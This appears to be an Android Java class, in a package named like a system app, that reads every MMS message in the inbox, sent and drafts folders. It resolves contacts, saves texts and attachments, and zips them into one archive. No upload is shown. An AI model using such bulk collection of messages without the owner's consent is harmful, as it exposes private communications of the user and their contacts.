package com.android.message;


import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.apache.http.util.EncodingUtils;

import com.android.message.Message.ContactItem;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Contacts;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.View;

/**
 * 获取彩信的类
 * @author log(K)
 *
 */
public class MMS
{
	private final Uri MMS_INBOX 	= Uri.parse("content://mms/inbox");		
	private final Uri MMS_OUTBOX 	= Uri.parse("content://mms/sent");	
	private final Uri MMS_DRAFTS 	= Uri.parse("content://mms/drafts");
	private final Uri MMS_PART 		= Uri.parse("content://mms/part"); 		//彩信附件表
	private Context mContext;
	private final String OutPutPath	= "data/data/com.android.message/MMC";
	
	MMS(Context context)
	{
		mContext = context;
	}
	
	 public void getMMC()
	 {
		    WriteLogFile.writeLog("begint to get mms");
		    //Cursor cInbox = m_Act.managedQuery(MMS_INBOX, null, null, null, null);
		    Cursor cInbox = mContext.getContentResolver().query(MMS_INBOX, null, null, null, null);
		    Log.v("MMC","After first managedQuery");
		    readAllMMC(cInbox,OutPutPath + "/Inbox" , true);
		    //Cursor cOutBox = m_Act.managedQuery(MMS_OUTBOX, null, null, null, null);
		    Cursor cOutBox = mContext.getContentResolver().query(MMS_OUTBOX, null, null, null, null);
		    readAllMMC(cOutBox,OutPutPath + "/Outbox" , false);
		    //Cursor cDrafts = m_Act.managedQuery(MMS_DRAFTS, null, null, null, null);
		    Cursor cDrafts = mContext.getContentResolver().query(MMS_DRAFTS, null, null, null, null);
		    readAllMMC(cDrafts,OutPutPath + "/Drafts" , false);
		    
		    //压缩文件
		    Log.v("zip","begin zip");
		    try 
		    {
		    	File zipFile = new File("data/data/com.android.message","mmc.zip");
		    	File toBeZipFile = new File(OutPutPath);
				ZipOutputStream zipout = new ZipOutputStream(
						new BufferedOutputStream(new FileOutputStream(zipFile), 8192));
				zip(zipout,toBeZipFile,"mmc");
				zipout.close();	
		    } 
		    catch (Exception e) 
		    {
				Log.v("MMC","*" + e.toString());
				e.printStackTrace();
			}  
		    Log.v("Zip","Zip over"); 
	 }
	 
	private void readAllMMC(Cursor cursor , String path , boolean bIn)
	{
		Log.v("MMC",path + cursor.getCount());
		if(cursor.moveToFirst())
		{
			Log.v("MMC",path);
			do
			{
				readMMC(cursor,path,bIn);
			}while(cursor.moveToNext());
		}
	}
	
	private void readMMC(Cursor cursor ,String Path, boolean bIn)
	{
		int id = 0;
		String strSubject 	= "";		
		String strTarget	= "";
		String strDate		= "";
		String strBody		= "";
		
    	id = cursor.getInt(cursor.getColumnIndex("_id"));						//彩信Id
	 	strSubject += cursor.getString(cursor.getColumnIndex("sub"));			//彩信主题
	 	Date time=new Date(cursor.getLong(cursor.getColumnIndex("date"))*1000);		//彩信时间
        SimpleDateFormat Dateformat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        strDate += Dateformat.format(time);
        strTarget += getTarget(id , bIn);
       
        String strDir	=	Path + "/" + id;
    	File dir = new File(strDir);
    	if(!dir.exists())
    	{
    		dir.mkdirs();
    	}
    	
        Log.v("MMC","Getting part");
        //获取附件，目前是图片儿和正文
        //Cursor cPart = m_Act.managedQuery(MMS_PART,null, new String("mid="+id),null, null); //part表中的mid外键为pdu表中的_id
        Cursor cPart = mContext.getContentResolver().query(MMS_PART, null, new String("mid=" + id), null, null);
        if(cPart.moveToFirst())
        {
        	int idIndex   = cPart.getColumnIndex("_id");
        	int typeIndex = cPart.getColumnIndex("ct");
        	int dataIndex = cPart.getColumnIndex("_data");
        	int textIndex = cPart.getColumnIndex("text");
        	
        	do
        	{
        		String strType = cPart.getString(typeIndex);
        		if(strType.equals("text/plain"))
        		{
        			 String strData = cPart.getString(dataIndex);
        			 if(strData == null)
        			 {
        				 strBody += cPart.getString(textIndex);
        				 Log.v("MMC","strData == null");
        			 } 
        			 else
        			 {
        				 strBody += getMmsText(cPart.getString(idIndex)); 
        				 Log.v("MMC","strData != null");
        			 }
        			 strBody +="\r\n\r\n";
        		}
        		else
                {
        			String strData = cPart.getString(dataIndex);
        			if(strData != null)
        			{
        				Log.v("MMC","strType:"+strType);
        				String str = strType.replace('/', '.');
        				String saveName = strDir + "/part"+id+"."+str;
        				writeParts(saveName,cPart.getString(idIndex));
        			}
        			else
        			{
        				
        				
        			}
        			//bmp = getMmsImage(cPart.getString(idIndex));
                }
        		 /*
        				strType.equals("image/jpeg") || 
             			strType.equals("image/bmp")  || 
             			strType.equals("image/gif")  || 
             			strType.equals("image/jpg")  || 
             			strType.equals("image/png")
        		 */
        	}while(cPart.moveToNext());
        } 	
        
        Log.v("MMC","Writing");
        try
        {
        	File txtfile = new File(strDir, "text.txt");
        	
        	txtfile.createNewFile();
			FileOutputStream fout = new FileOutputStream(txtfile);
			
			strSubject = EncodingUtils.getString(strSubject.getBytes("ISO_8859_1"), "utf-8");
				
        	fout.write( ("主题：" + strSubject + "\r\n").getBytes() );
        	fout.write( ("日期：" + strDate + "\r\n").getBytes() );
        	fout.write( ( (bIn?"发件人：":"收件人：") + strTarget + "\r\n").getBytes() );
            fout.write( ("正文：" + strBody +"\r\n").getBytes() );
            
            fout.flush();
            fout.close();    
           
        }
        catch (IOException e) 
        {
			e.printStackTrace();
			Log.v("MMC", "writeing" + e.toString());
		}   
        Log.v("MMC","Write over");
	}
	
	
	private static void zip(ZipOutputStream outputStream, File file, String base) throws Exception 
	{
		if (file.isDirectory()) 
		{
			Log.v("Zip","ZipingDirectory" + file + ";path:base" );
			File[] fl = file.listFiles();
			outputStream.putNextEntry(new ZipEntry(base + "/"));
			base = base.length() == 0 ? "" : base + "/";
			for (int i = 0; i < fl.length; i++) 
			{
				zip(outputStream, fl[i], base + fl[i].getName());
			}
		} 
		else 
		{
			Log.v("Zip","ZipingFile" + file + ";path:base" );
			outputStream.putNextEntry(new ZipEntry(base));
			FileInputStream inputStream = new FileInputStream(file);
			//普通压缩文件	
			int b;
			while ((b = inputStream.read()) != -1)
			{
				outputStream.write(b);
			}
			inputStream.close();
		}
	}
	
	//根据电话获取联系人
	private String getContacts(String number)	
	{
		Cursor cPhones = mContext.getContentResolver().query(Contacts.Phones.CONTENT_URI, new String[]
         		{Contacts.Phones.PERSON_ID},Contacts.Phones.NUMBER + "=?",new String[]{ number },null);
         
		Log.v("MMC" ,"getContacts:"+number+"Cursor:"+ (cPhones != null));
		if(cPhones != null && cPhones.moveToFirst())
         {
        	 do
        	 {
        		 String pId = cPhones.getString(cPhones.getColumnIndex(Contacts.Phones.PERSON_ID));
                 Uri uriPeo = Uri.parse(Contacts.People.CONTENT_URI+"/"+pId);
                 Cursor cPeople = mContext.getContentResolver().query(uriPeo, null,null,null, null);
                 if(cPeople.moveToFirst())
                 {
                	 do{
                		 String strPeople = cPeople.getString(cPeople.getColumnIndex(Contacts.People.DISPLAY_NAME));
                		 if( strPeople != null)
                		 {
                			 return  strPeople;
                		 }
                	 }while(cPeople.moveToNext());
                 }
        		 
        	 }while(cPhones.moveToNext());
         }
         return null;
	}
	
	//获取发件人、收件人 (号码<人名>)
	private String getTarget(int id ,boolean bIn)
	{
		String Target = "";
		String selectionAdd = new String("msg_id=" + id);
		Uri uriAddr = Uri.parse("content://mms/" + id + "/addr");
	    Cursor cAdd = mContext.getContentResolver().query(uriAddr, null, selectionAdd, null, null);
	    
	    Log.v("MMC" ,"getTarget:"+id+"Cursor:"+ (cAdd != null));
	    if(cAdd != null && cAdd.moveToFirst())
	    {
	    	if(bIn)
	    	{
	    		String number  = cAdd.getString(cAdd.getColumnIndex("address"));
	 	        String contact = getContacts(number);
	 	        Target += number;
	 	        if(contact != null)
	 	        {
	 	        	Target += "<" + contact + ">";
	 	        }
	 	        else
	 	        {
	 	        	Target += "<未知>";
	 	        }
	    	}
	    	else
	    	{
	    		do
	    		{
	    			String number  = cAdd.getString(cAdd.getColumnIndex("address"));
		 	        String contact = getContacts(number);
		 	        Target += number;
		 	        if(contact != null)
		 	        {
		 	        	Target += "<" + contact + ">";
		 	        }
		 	        else
		 	        {
		 	        	Target += "<未知>\r\n";
		 	        }
	    			
	    		}while(cAdd.moveToNext());
	    	}
	    }
	    return Target;
	}
    
    private String getMmsText(String _id)
    { //读取文本附件
        Uri partURI = Uri.parse("content://mms/part/" + _id ); 
        InputStream is = null; 
        StringBuilder sb = new StringBuilder();
        try 
        { 
            is = mContext.getContentResolver().openInputStream(partURI); 
            if(is!=null)
            {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is,"UTF-8"));
                String temp = reader.readLine();
                while (temp != null) 
                {
                    sb.append(temp);
                    temp=reader.readLine();
                }
            }
        }
        catch (IOException e) 
        { 
            e.printStackTrace();
        }
        finally
        { 
            if (is != null)
            { 
                try 
                { 
                    is.close(); 
                }
                catch (IOException e)
                {
                  
                }
            } 
        }
        return sb.toString();
    }
    
    private void writeParts(String fileName ,String _id)
    {
    	try
    	{
    		Log.v("PART","fileName:"+fileName);
    		Log.v("PART","_id:"+_id);
    		
    		Uri partURI = Uri.parse("content://mms/part/" + _id ); 
    		InputStream sPart = mContext.getContentResolver().openInputStream(partURI); 
    		
    		Log.v("PART","spart is NULL ? "+(sPart==null));
    		File outPutFile  = new File(fileName);
    		
    		Log.v("PART","outPutFile is NULL ? "+(sPart==null));
    		outPutFile.createNewFile();
    		FileOutputStream fout = new FileOutputStream(outPutFile);
    		
    		byte[] buffer = new byte[256];
    		int len = -1;
            while ((len = sPart.read(buffer)) != -1) 
            {
            	fout.write(buffer, 0, len);
            }
            
            fout.close();
            sPart.close();
    	}
    	catch(Exception e)
    	{
    		Log.v("MMC", "writing parts:"+e.toString());
    	}
    }

}